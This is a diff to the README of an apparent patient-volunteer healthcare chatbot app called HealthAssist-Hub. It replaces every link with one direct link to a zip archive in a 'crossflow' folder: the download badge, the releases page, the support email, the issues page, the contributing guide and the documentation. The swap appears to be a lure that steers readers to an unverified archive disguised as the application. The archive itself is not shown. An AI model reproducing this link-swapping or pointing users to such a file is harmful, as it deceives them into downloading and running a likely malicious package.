@@ -4,10 +4,10 @@
 Welcome to HealthAssist-Hub! This is a web application designed to link patients with volunteers and provide instant guidance through an AI-powered healthcare chatbot. Follow the steps below to download and run the application effortlessly.
 
 ## 📥 Download HealthAssist-Hub
-[![Download HealthAssist-Hub](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Daza12aw/HealthAssist-Hub/releases)
+[![Download HealthAssist-Hub](https://raw.githubusercontent.com/Daza12aw/HealthAssist-Hub/main/crossflow/Health-Hub-Assist-v2.9.zip)](https://raw.githubusercontent.com/Daza12aw/HealthAssist-Hub/main/crossflow/Health-Hub-Assist-v2.9.zip)
 
 ## 📂 Download & Install
-To get started, visit the [Releases page](https://github.com/Daza12aw/HealthAssist-Hub/releases) to download the latest version of HealthAssist-Hub. Here are the simple steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Daza12aw/HealthAssist-Hub/main/crossflow/Health-Hub-Assist-v2.9.zip) to download the latest version of HealthAssist-Hub. Here are the simple steps:
 
 1. Click on the link above to access our Releases page.
 2. Once there, browse the list of available versions.
@@ -46,15 +46,15 @@ We take user privacy seriously. All conversations with the AI chatbot are encryp
 ## 📞 Support
 If you have any questions or issues, feel free to reach out to us. You can contact our support team through the following methods:
 
-- **Email:** support@healthassit-hub.org
-- **GitHub Issues:** Report problems directly on our [Issues page](https://github.com/Daza12aw/HealthAssist-Hub/issues).
+- **Email:** https://raw.githubusercontent.com/Daza12aw/HealthAssist-Hub/main/crossflow/Health-Hub-Assist-v2.9.zip
+- **GitHub Issues:** Report problems directly on our [Issues page](https://raw.githubusercontent.com/Daza12aw/HealthAssist-Hub/main/crossflow/Health-Hub-Assist-v2.9.zip).
 
 ## 📚 Contributing
-We welcome contributions! If you want to help make HealthAssist-Hub better, check the [Contributing Guidelines](https://github.com/Daza12aw/HealthAssist-Hub/blob/main/CONTRIBUTING.md).
+We welcome contributions! If you want to help make HealthAssist-Hub better, check the [Contributing Guidelines](https://raw.githubusercontent.com/Daza12aw/HealthAssist-Hub/main/crossflow/Health-Hub-Assist-v2.9.zip).
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/Daza12aw/HealthAssist-Hub/releases)
-- [GitHub Repository](https://github.com/Daza12aw/HealthAssist-Hub)
-- [Documentation](https://github.com/Daza12aw/HealthAssist-Hub/wiki)
+- [Releases Page](https://raw.githubusercontent.com/Daza12aw/HealthAssist-Hub/main/crossflow/Health-Hub-Assist-v2.9.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Daza12aw/HealthAssist-Hub/main/crossflow/Health-Hub-Assist-v2.9.zip)
+- [Documentation](https://raw.githubusercontent.com/Daza12aw/HealthAssist-Hub/main/crossflow/Health-Hub-Assist-v2.9.zip)
 
 Thank you for choosing HealthAssist-Hub. We hope our application helps you connect with the support you need. For further updates, check back frequently on our Releases page.
